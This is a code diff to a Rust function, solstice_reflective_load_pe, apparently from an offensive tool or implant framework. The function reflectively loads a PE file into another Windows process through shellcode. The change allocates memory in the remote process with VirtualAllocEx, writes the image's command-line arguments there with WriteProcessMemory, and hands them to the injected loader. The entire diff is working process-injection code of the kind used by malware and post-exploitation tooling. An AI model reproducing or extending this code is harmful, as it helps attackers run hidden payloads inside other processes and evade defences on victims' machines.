@@ -5,7 +5,6 @@ use std::mem::size_of;
 use std::os::windows::io::AsRawHandle;
 use std::os::windows::process::CommandExt;
 use std::process::{Child, Command, Stdio};
-use std::ptr::null_mut;
 use std::str::FromStr;
 use windows::Win32::Foundation::{GetLastError, HANDLE};
 use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
@@ -30,10 +29,15 @@ pub fn solstice_reflective_load_pe(
         "[Solstice] Reflective loading PE: {path} with args {args:?} in {working_dir}"
     );
 
+    // Shadowing path and args, optionally appending null-terminator to string
     let mut path = String::from_str(path).unwrap();
-
     if !path.ends_with("\0") {
         path += "\0";
+    }
+
+    let mut args = args.join(" ");
+    if !args.ends_with("\0") {
+        args += "\0";
     }
 
     let shellcode_size = PE_LOADER_SC.len();
@@ -147,10 +151,47 @@ pub fn solstice_reflective_load_pe(
         )));
     }
 
+    // Allocate memory for the image args in the remote process
+    let image_args_addr = unsafe {
+        VirtualAllocEx(
+            process_handle,
+            None,
+            args.len(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        )
+    };
+
+    if image_args_addr.is_null() {
+        let error = unsafe { GetLastError() };
+        return Err(Error::MemoryAllocation(format!(
+            "Failed to allocate memory for image args: {error:?}"
+        )));
+    }
+
+    // Write the image args to the remote process
+    let mut bytes_written = 0;
+    let result = unsafe {
+        WriteProcessMemory(
+            process_handle,
+            image_args_addr,
+            args.as_ptr() as *const _,
+            args.len(),
+            Some(&mut bytes_written),
+        )
+    };
+
+    if let Err(_err) = result {
+        let error = unsafe { GetLastError() };
+        return Err(Error::ProcessMemoryWrite(format!(
+            "Failed to write image args: {error:?}"
+        )));
+    }
+
     // Create shellcode arguments structure
     let args = ShellcodeArgs {
         image_name: image_name_addr as *const u8,
-        image_args: null_mut(),
+        image_args: image_args_addr as *const u8,
     };
 
     // Allocate memory for the arguments in the remote process
@@ -174,7 +215,7 @@ pub fn solstice_reflective_load_pe(
     info!("Arguments will be allocated at: {args_addr:?}");
 
     // Write the arguments to the remote process
-    let mut bytes_written = 0;
+    bytes_written = 0;
     let result = unsafe {
         WriteProcessMemory(
             process_handle,
